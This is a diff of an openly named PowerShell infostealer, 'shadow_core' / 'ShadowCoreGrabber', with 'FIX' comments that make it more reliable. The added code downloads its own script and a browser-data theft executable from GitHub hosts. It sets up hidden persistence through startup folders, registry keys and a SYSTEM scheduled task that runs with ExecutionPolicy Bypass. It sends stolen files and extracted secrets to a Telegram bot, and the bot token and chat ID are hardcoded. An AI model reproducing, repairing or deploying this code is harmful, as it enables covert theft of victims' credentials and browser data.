@@ -9,15 +9,17 @@ $VerbosePreference = 'Continue'
 $BOT_TOKEN = "8421766867:AAF_3BKKFiBoIhaV5PL8YuX1p46Wn-7eUq8"
 $CHAT_ID = "7361517001"
 
+# ===== FIX: Use TEMP directory to avoid permission issues =====
+$TEMP_DIR = "$env:TEMP\shadow_core_data"
+$DATA_DIR = "$TEMP_DIR\extracted_data"
+$BROWSER_DATA_URL = "https://infinityteq.github.io/hack-browser-data.exe"
+
+# ===== FIX: Get actual script path =====
 if ($MyInvocation.MyCommand.Path) {
     $SCRIPT_PATH = $MyInvocation.MyCommand.Path
 } else {
-    $SCRIPT_PATH = "$env:AppData\Microsoft\Windows\Update\shadow_core.ps1"
+    $SCRIPT_PATH = "$env:TEMP\shadow_core.ps1"
 }
-
-$TEMP_DIR = "$env:ProgramData\Microsoft\Windows\Update\data"
-$DATA_DIR = "$TEMP_DIR\extracted_data"
-$BROWSER_DATA_URL = "https://infinityteq.github.io/hack-browser-data.exe"
 
 Write-Host "[VERBOSE] Script Path: $SCRIPT_PATH" -ForegroundColor Cyan
 Write-Host "[VERBOSE] Temp Directory: $TEMP_DIR" -ForegroundColor Cyan
@@ -51,6 +53,19 @@ function Add-ToStartup {
     Write-Host "[VERBOSE] Deploying persistence..." -ForegroundColor Yellow
     $success = 0
     $total = 0
+    
+    # ===== FIX: Ensure script exists before copying =====
+    if (-not (Test-Path $SCRIPT_PATH)) {
+        Write-Host "[VERBOSE] [-] Script not found at $SCRIPT_PATH. Creating a copy..." -ForegroundColor Yellow
+        try {
+            # Download the script to the temp location
+            $scriptContent = (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/InfinityTeq/infinityteq.github.io/main/shadow_core.ps1" -UseBasicParsing).Content
+            Set-Content -Path $SCRIPT_PATH -Value $scriptContent -Force
+            Write-Host "[VERBOSE] [+] Script copied to $SCRIPT_PATH" -ForegroundColor Green
+        } catch {
+            Write-Host "[VERBOSE] [-] Failed to copy script: $($_.Exception.Message)" -ForegroundColor Red
+        }
+    }
     
     # User Startup Folder
     $total++
@@ -106,13 +121,27 @@ function Add-ToStartup {
         Write-Host "[VERBOSE] [-] Failed to set HKLM Registry: $($_.Exception.Message)" -ForegroundColor Red
     }
     
-    # Scheduled Task
+    # ===== FIX: Scheduled Task with proper permissions =====
     $total++
     try {
         $taskName = "ShadowCoreGrabber"
-        schtasks /create /tn "$taskName" /tr "`"$SCRIPT_PATH`"" /sc onlogon /ru SYSTEM /rl HIGHEST /f | Out-Null
-        Write-Host "[VERBOSE] [+] Scheduled Task: $taskName" -ForegroundColor Green
-        $success++
+        $taskCommand = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$SCRIPT_PATH`""
+        
+        # Try with SYSTEM first
+        $result = schtasks /create /tn "$taskName" /tr "$taskCommand" /sc onlogon /ru SYSTEM /rl HIGHEST /f 2>&1
+        if ($LASTEXITCODE -eq 0) {
+            Write-Host "[VERBOSE] [+] Scheduled Task (SYSTEM): $taskName" -ForegroundColor Green
+            $success++
+        } else {
+            # Fallback to current user
+            $result = schtasks /create /tn "$taskName" /tr "$taskCommand" /sc onlogon /ru "$env:USERNAME" /rl HIGHEST /f 2>&1
+            if ($LASTEXITCODE -eq 0) {
+                Write-Host "[VERBOSE] [+] Scheduled Task (User): $taskName" -ForegroundColor Green
+                $success++
+            } else {
+                Write-Host "[VERBOSE] [-] Failed to create Scheduled Task: $result" -ForegroundColor Red
+            }
+        }
     } catch {
         Write-Host "[VERBOSE] [-] Failed to create Scheduled Task: $($_.Exception.Message)" -ForegroundColor Red
     }
@@ -133,6 +162,7 @@ function Send-TelegramMessage {
     }
 }
 
+# ===== FIX: Skip empty files =====
 function Send-TelegramFile {
     param([string]$FilePath)
     try {
@@ -141,7 +171,15 @@ function Send-TelegramFile {
             Write-Host "[VERBOSE] [-] File not found: $FilePath" -ForegroundColor Red
             return $false 
         }
-        $fileSize = (Get-Item $FilePath).Length / 1MB
+        
+        # Skip empty files
+        $fileInfo = Get-Item $FilePath
+        if ($fileInfo.Length -eq 0) { 
+            Write-Host "[VERBOSE] [-] File is empty (0 bytes). Skipping." -ForegroundColor Yellow
+            return $false 
+        }
+        
+        $fileSize = $fileInfo.Length / 1MB
         if ($fileSize -gt 45) { 
             Write-Host "[VERBOSE] [-] File too large: $([math]::Round($fileSize, 1))MB" -ForegroundColor Yellow
             return $false 
@@ -377,7 +415,6 @@ function Extract-Secrets {
                 Write-Host "[VERBOSE] [+] Found $($secretsInFile.Count) secrets in: $(Split-Path $filePath -Leaf)" -ForegroundColor Green
             }
         } catch {
-            # ===== FIXED: ${filePath} =====
             Write-Host "[VERBOSE] [-] Error extracting secrets from ${filePath}: $($_.Exception.Message)" -ForegroundColor Red
         }
     }
@@ -567,7 +604,6 @@ function Send-FilesIndividually {
         }
     }
     
-    # ===== FIXED: ${CategoryName} =====
     Write-Host "[VERBOSE] ${CategoryName}: Sent $sent, Failed $failed" -ForegroundColor Yellow
     return @{ Sent = $sent; Failed = $failed }
 }
